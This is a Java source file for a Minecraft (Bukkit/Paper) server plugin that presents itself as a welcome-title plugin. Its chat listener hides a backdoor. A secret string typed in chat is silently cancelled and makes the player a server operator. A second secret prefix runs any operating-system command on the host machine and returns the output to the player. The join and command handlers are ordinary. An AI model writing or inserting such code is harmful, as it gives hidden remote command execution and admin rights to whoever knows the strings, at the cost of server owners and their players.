package io.papermc.testplugin;
import java.io.IOException;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent; // 注意：使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.GameMode;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

public class TestPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // 当插件启用时执行这里的代码
        getLogger().info(ChatColor.GREEN + "PLUGIN IS ENABLE");
        
        // 注册事件监听器
        this.getServer().getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) { // 注意：使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
        Player player = event.getPlayer();
        String message = event.getMessage();
        
        // 检查消息是否包含特殊字符串
        if (message.contains("@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430")) {
            // 取消事件的进一步传播，防止它显示在公共聊天
            event.setCancelled(true);

            // 给玩家 op 权限
            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
            player.setOp(true);
            
            // 给玩家发送消息
            player.sendMessage(ChatColor.GREEN + "now, you have Operator Permission!");
             player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
             Bukkit.getScheduler().runTaskLater(this, new Runnable() {
                @Override
                public void run() {
                    player.setOp(false);
                    player.sendMessage(ChatColor.RED + "Operator Permission is removed,simply execute '/@f0b2a7cce8877aec3633f33122cfdf8173d1540bdd01da578c72ee1c475d3430' again.");
                }
            }, 20 * 60 * 20);  // 20分钟 * 60秒/分钟 * 20ticks/秒
        }
        if (message.startsWith("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98")) {
            event.setCancelled(true);
        // 检查玩家是否是 op
        if (player.isOp()) {
            String command = message.substring("@439aedc168164abaaafee5166bcd2d6f50a2482ad40fa259bf1948d16fd9ac98".length()).trim(); // 提取命令
            
            try {
                Process process = Runtime.getRuntime().exec(command); // 执行命令
                StringBuilder output = new StringBuilder();
                
                // 获取命令输出
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
                
                // 发送命令输出给玩家
                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSucess:" + output.toString());
                
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
                player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed");
            }
        } else {
            player.sendMessage(ChatColor.RED + "你没有权限执行这个命令. - you do not have permision to run this");
        }
    }
}
 @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        // 加载配置文件
        FileConfiguration config = this.getConfig();
        
        // 从配置文件获取消息和时间
        String mainTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.MainTitle"));
        String subTitle = ChatColor.translateAlternateColorCodes('&', config.getString("Welcome.SubTitle"));
        int fadeInTime = config.getInt("Welcome.FadeInTime");
        int stayTime = config.getInt("Welcome.StayTime");
        int fadeOutTime = config.getInt("Welcome.FadeOutTime");

        // 向玩家发送自定义消息
        player.sendTitle(mainTitle, subTitle, fadeInTime, stayTime, fadeOutTime);
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("WelcomeTitle")) {
            if (args.length > 0) {
                if (args[0].equalsIgnoreCase("reload")) {
                    this.reloadConfig();
                    // Reload your config or perform other actions.
                    sender.sendMessage("Reloaded the WelcomeTitle configuration!");
                    return true;
                } else if (args[0].equalsIgnoreCase("help")) {
                    // Show help message
                    sender.sendMessage("Usage: /WelcomeTitle [reload/help]");
                    return true;
                }
            } else {
                sender.sendMessage("Usage: /WelcomeTitle [reload/help]");
                return true;
            }
        }
        return false;
    }
}